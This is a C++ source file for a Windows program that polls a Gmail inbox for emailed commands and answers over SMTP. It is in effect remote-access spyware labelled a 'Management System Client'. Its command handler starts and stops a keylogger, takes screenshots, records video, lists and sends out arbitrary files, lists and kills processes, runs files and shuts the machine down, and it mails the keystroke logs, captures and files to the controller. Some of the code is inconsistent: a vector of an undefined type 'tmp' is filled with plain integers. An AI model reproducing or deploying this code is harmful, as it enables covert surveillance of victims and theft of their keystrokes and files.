#include "Mail.hpp"
#include <vector>
#include <cassert>
#include <iostream>

CURL *MailService::m_Curl = curl_easy_init();
std::string MailService::m_Username = "";
std::string MailService::m_Password = "";
std::string MailService::m_CertPath = "";
std::atomic_bool MailService::m_Initialized = false;
FileFeature *MailService::m_FileFeature = nullptr;
KeyloggerFeature *MailService::m_KeyloggerFeature = nullptr;
VideoFeature *MailService::m_VideoFeature = nullptr;
WindowFeature *MailService::m_WindowFeature = nullptr;
ProcessFeature *MailService::m_ProcessFeature = nullptr;
std::atomic_bool MailService::m_isRunning = false;

size_t MailService::SearchCallback(void *contents, const size_t size, const size_t nmemb, void *userp) {
    std::string res = static_cast<char *>(contents);
    auto mailIds = static_cast<std::vector<int> *>(userp);
    res = res.substr(0, res.find("\r\n"));
    if (res.starts_with("* SEARCH")) {
        res.erase(0, 8);
        size_t pos = 0;
        while ((pos = res.find(' ')) != std::string::npos && res.front() != '\r') {
            std::string idStr = res.substr(0, pos);
            if (!idStr.empty()) {
                mailIds->push_back(std::stoi(idStr));
            }
            res.erase(0, pos + 1);
        }
        if (!res.empty()) {
            mailIds->push_back(std::stoi(res));
        }
    } else {
        throw std::invalid_argument("Invalid search string");
    }
    std::cout << "Found " << mailIds->size() << " unseen mails." << std::endl;
    return size * nmemb;
}

size_t MailService::FetchCallback(void *contents, const size_t size, const size_t nmemb, void *userp) {
    std::string res = static_cast<char *>(contents);
    res = res.substr(res.find("\r\n") + 2);
    res = res.substr(0, res.find("\r\n"));
    auto mailContent = static_cast<std::string *>(userp);
    mailContent->assign(res);
    return size * nmemb;
}

MailService::MailService() {
    m_Curl = curl_easy_init();
    if (!m_Curl) {
        throw std::runtime_error("Failed to initialize CURL");
    }
    m_Username = "";
    m_Password = "";
    m_CertPath = "";
}

MailService::~MailService() {
    if (m_Initialized) {
        CleanUpCURL();
    }
}

void MailService::Init(const std::string &username, const std::string &password,
                       const std::string &certPath) {
    m_Username = username;
    m_Password = password;
    m_CertPath = certPath;
    curl_easy_setopt(m_Curl, CURLOPT_USERNAME, m_Username.c_str());
    curl_easy_setopt(m_Curl, CURLOPT_PASSWORD, m_Password.c_str());
    curl_easy_setopt(m_Curl, CURLOPT_CAINFO, m_CertPath.c_str());
    curl_easy_setopt(m_Curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
    curl_easy_setopt(m_Curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(m_Curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(m_Curl, CURLOPT_CERTINFO, 1L);
    m_Initialized = true;
}

void MailService::Init(const std::string &confFilePath) {
    std::ifstream inputFile(confFilePath);
    if (!inputFile.is_open()) {
        throw std::runtime_error("Failed to open configuration file: " + confFilePath);
    }
    std::getline(inputFile, m_Username);
    std::getline(inputFile, m_Password);
    std::getline(inputFile, m_CertPath);
    inputFile.close();
    curl_easy_setopt(m_Curl, CURLOPT_USERNAME, m_Username.c_str());
    curl_easy_setopt(m_Curl, CURLOPT_PASSWORD, m_Password.c_str());
    curl_easy_setopt(m_Curl, CURLOPT_CAINFO, m_CertPath.c_str());
    curl_easy_setopt(m_Curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
    curl_easy_setopt(m_Curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(m_Curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(m_Curl, CURLOPT_CERTINFO, 1L);
    m_Initialized = true;
}

void MailService::CheckMail() {
    assert(m_Initialized == true);
    CURL *localCURL = curl_easy_duphandle(m_Curl);
    if (!localCURL) {
        throw std::runtime_error("Failed to duplicate CURL handle");
    }

    std::vector<tmp> mailIds;

    curl_easy_setopt(localCURL, CURLOPT_WRITEFUNCTION, SearchCallback);
    curl_easy_setopt(localCURL, CURLOPT_WRITEDATA, &mailIds);
    curl_easy_setopt(localCURL, CURLOPT_URL, "imaps://imap.gmail.com:993/INBOX");
    curl_easy_setopt(localCURL, CURLOPT_CUSTOMREQUEST, "SEARCH UNSEEN");

    if (const CURLcode res = curl_easy_perform(localCURL); res != CURLE_OK) {
        CleanUpCURL();
        throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
    }
    for (const auto &mailCon: mailIds) {
        HandleMailCommand(mailCon.id, mailCon.to);
    }
    curl_easy_cleanup(localCURL);
    localCURL = nullptr;
}

void MailService::CleanUpCURL() {
    assert(m_Initialized == true);
    if (m_Curl) {
        curl_easy_cleanup(m_Curl);
        m_Curl = nullptr;
    }
    m_Initialized = false;
    m_Username.clear();
    m_Password.clear();
    m_CertPath.clear();
}

void MailService::HandleMailCommand(const int mailId, std::string to) {
    assert(m_Initialized == true);
    CURL *localCURL = curl_easy_duphandle(m_Curl);
    if (localCURL == nullptr) {
        throw std::runtime_error("Failed to duplicate CURL handle");
    }
    std::string mailContent;
    curl_easy_setopt(localCURL, CURLOPT_WRITEFUNCTION, FetchCallback);
    curl_easy_setopt(localCURL, CURLOPT_WRITEDATA, &mailContent);
    curl_easy_setopt(localCURL, CURLOPT_URL, "imaps://imap.gmail.com:993/INBOX");
    curl_easy_setopt(localCURL, CURLOPT_CUSTOMREQUEST, std::format("FETCH {} BODY[1]", mailId).c_str());
    if (const CURLcode res = curl_easy_perform(localCURL); res != CURLE_OK) {
        CleanUpCURL();
        throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
    }
    std::cout << "Mail ID: " << mailId << ", Content: " << mailContent << std::endl;
    std::string command = mailContent.substr(0, mailContent.find("\r\n"));
    for (auto &c: command) c = toupper(c);

    if (command == "SCREENSHOT") {
        std::cout << "Handling screenshot command." << std::endl;
        m_WindowFeature->requestingFeature({ 0x00, 0, nullptr});
        MailAttachment attachment;
        attachment.name = "screenshot.bmp";
        attachment.command = MailCommand::SCREENSHOT;
        attachment.content = m_WindowFeature->getScreenshotData();
        Response(to, "Here is the screenshot.", &attachment);
    } else if (command == "SHUTDOWN") {
        std::cout << "Handling shutdown command." << std::endl;
        m_WindowFeature->requestingFeature({ 0x03, 0, nullptr});
        Response(to, "System is shutting down.", nullptr);
    } else if (command == "RESTART") {
        std::cout << "Handling restart command." << std::endl;
        m_WindowFeature->requestingFeature({ 0x04, 0, nullptr});
        Response(to, "System is restarting.", nullptr);
    } else if (command == "KEYLOGGER_START") {
        std::cout << "Start keylogger command." << std::endl;
        m_KeyloggerFeature->requestingFeature({ 0x01, 0, nullptr});
        Response(to, "Keylogger started successfully.", nullptr);
    } else if (command == "KEYLOGGER_STOP") {
        std::cout << "Stop keylogger command." << std::endl;
        m_KeyloggerFeature->requestingFeature({ 0x02, 0, nullptr});
        MailAttachment attachment;
        attachment.name = "keylog.txt";
        attachment.command = MailCommand::KEYLOGGER;
        attachment.content = m_KeyloggerFeature->getLogging();
        Response(to, "Keylogger stopped. Here is the log file.", &attachment);
    } else if (command == "FILE_TRANSFER") {
        std::string fileName = mailContent.substr(mailContent.find("\r\n") + 2);
        std::cout << "Handling file transfer command for file: " << fileName << std::endl;
        m_FileFeature->requestingFeature({ 0x01, (int)fileName.size(), (char*)fileName.c_str() });
        MailAttachment attachment;
        attachment.name = fileName;
        attachment.command = MailCommand::FILE_TRANSFER;
        attachment.content = m_FileFeature->getCurrentData();
        if (attachment.content.empty()) {
            Response(to, "Failed to retrieve file content.", nullptr);
            return;
        }
        Response(to, "Here is the requested file.", &attachment);
    } else if (command == "START_VIDEO_RECORDING" || command == "START_VIDEO") {
        std::cout << "Start video recording command." << std::endl;
        m_VideoFeature->requestingFeature({ 0x01, 0, nullptr });
        Response(to, "Video recording started successfully.", nullptr);
    } else if (command == "STOP_VIDEO_RECORDING" || command == "STOP_VIDEO") {
        std::cout << "Stop video recording command." << std::endl;
        m_VideoFeature->requestingFeature({ 0x02, 0, nullptr });
        MailAttachment attachment;
        attachment.name = "video.mp4";
        attachment.command = MailCommand::VIDEO;
        attachment.content = m_VideoFeature->videoContent;
        if (attachment.content.empty()) {
            Response(to, "Failed to retrieve video content.", nullptr);
            return;
        }
        Response(to, "Video recording stopped. Here is the video file.", &attachment);
    } else if (command == "VOLUME_UP") {
        std::cout << "Handling volume up command." << std::endl;
        m_WindowFeature->requestingFeature({ 0x01, 0, nullptr });
        Response(to, "Volume increased successfully.", nullptr);
    } else if (command == "VOLUME_DOWN") {
        std::cout << "Handling volume down command." << std::endl;
        m_WindowFeature->requestingFeature({ 0x02, 0, nullptr });
        Response(to, "Volume decreased successfully.", nullptr);
    } else if (command == "LIST_FILES") {
        std::string dirName = mailContent.substr(mailContent.find("\r\n") + 2);
        std::cout << "Handling list files command for folder " << dirName << '.' << std::endl;
        m_FileFeature->requestingFeature({ 0x02, (int)dirName.size(), (char*)dirName.c_str() });
        MailAttachment attachment;
        attachment.name = "file_list.txt";
        attachment.command = MailCommand::LIST_FILES;
        attachment.content = m_FileFeature->getCurrentData();
        if (attachment.content.empty()) {
            Response(to, "Failed to retrieve file list.", nullptr);
            return;
        }
        Response(to, "Here is the list of files in the directory.", &attachment);
    } else if (command == "LIST_PROCESSES") {
        std::cout << "Handling list processes command." << std::endl;
        m_ProcessFeature->requestingFeature({ 0x01, 0, nullptr });
        MailAttachment attachment;
        attachment.name = "process_list.txt";
        attachment.command = MailCommand::LIST_PROCESSES;
        attachment.content = m_ProcessFeature->fromAllNode();
        if (attachment.content.empty()) {
            Response(to, "Failed to retrieve process list.", nullptr);
            return;
        }
        Response(to, "Here is the list of running processes.", &attachment);
    } else if (command == "KILL_PROCESS") {
        std::string PID = mailContent.substr(mailContent.find("\r\n") + 2);
        std::cout << "Handling kill process command for PID: " << PID << '.' << std::endl;
        m_ProcessFeature->requestingFeature({ 0x02, (int)PID.size(), (char*)PID.c_str() });
        Response(to, "Process killed successfully.", nullptr);
    } else if (command == "RUN_FILE") {
        std::string filePath = mailContent.substr(mailContent.find("\r\n") + 2);
        std::cout << "Handling run file command for file: " << filePath << '.' << std::endl;
        m_ProcessFeature->requestingFeature({ 0x03, (int)filePath.size(), (char*)filePath.c_str() });
        Response(to, "File executed successfully.", nullptr);
    } else {
        std::cerr << "Unknown command: " << mailContent << std::endl;
        Response(to, "Unknown command received.", nullptr);
    }

    curl_easy_cleanup(localCURL);
    localCURL = nullptr;
}

void MailService::Response(const std::string &to, const std::string &body, MailAttachment *attachment) {
    assert(m_Initialized == true);
    CURL *localCURL = curl_easy_duphandle(m_Curl);
    if (localCURL == nullptr) {
        throw std::runtime_error("Failed to duplicate CURL handle");
    }
    curl_easy_setopt(localCURL, CURLOPT_URL, "smtp://smtp.gmail.com:587");
    curl_easy_setopt(localCURL, CURLOPT_MAIL_FROM, m_Username.c_str());
    curl_easy_setopt(localCURL, CURLOPT_UPLOAD, 1L);
    // curl_easy_setopt(localCURL, CURLOPT_READFUNCTION, SMTPCallback);

    curl_slist *recipients = nullptr;
    recipients = curl_slist_append(recipients, to.c_str());
    curl_easy_setopt(localCURL, CURLOPT_MAIL_RCPT, recipients);

    curl_slist *headers = nullptr;
    headers = curl_slist_append(headers, std::format("To: {}", to).c_str());
    headers = curl_slist_append(headers, std::format("From: {}", m_Username).c_str());
    headers = curl_slist_append(headers, "Subject: Response from Management System Client");
    curl_easy_setopt(localCURL, CURLOPT_HTTPHEADER, headers);

    curl_mime *mime = curl_mime_init(localCURL);
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_data(part, body.c_str(), CURL_ZERO_TERMINATED);
    curl_mime_type(part, "text/plain");
    if (attachment != nullptr) {
        part = curl_mime_addpart(mime);
        curl_mime_name(part, attachment->name.c_str());
        switch (attachment->command) {
            case MailCommand::SCREENSHOT:
                curl_mime_type(part, "image/bmp");
                break;
            case MailCommand::FILE_TRANSFER:
                curl_mime_type(part, "application/octet-stream");
                break;
            case MailCommand::VIDEO:
                curl_mime_type(part, "video/mp4");
                break;
            case MailCommand::LIST_FILES:
            case MailCommand::LIST_PROCESSES:
            case MailCommand::KEYLOGGER:
            default:
                curl_mime_type(part, "text/plain");
                break;
        }
        curl_mime_data(part, attachment->content.c_str(), attachment->content.size());
        curl_mime_encoder(part, "base64");
    }

    curl_easy_setopt(localCURL, CURLOPT_MIMEPOST, mime);
    const CURLcode code = curl_easy_perform(localCURL);
    if (code != CURLE_OK) {
        CleanUpCURL();
        throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(code)));
    }
    curl_mime_free(mime);
    curl_easy_cleanup(localCURL);
    localCURL = nullptr;
    std::cout << "Email sent to " << to << " with body: " << body << std::endl;
}

DWORD MailService::StartMailService(LPVOID *lpParam) {
    m_isRunning = true;
    while (m_isRunning) {
        CheckMail();
        Sleep(1000);
    }
    return 0;
}
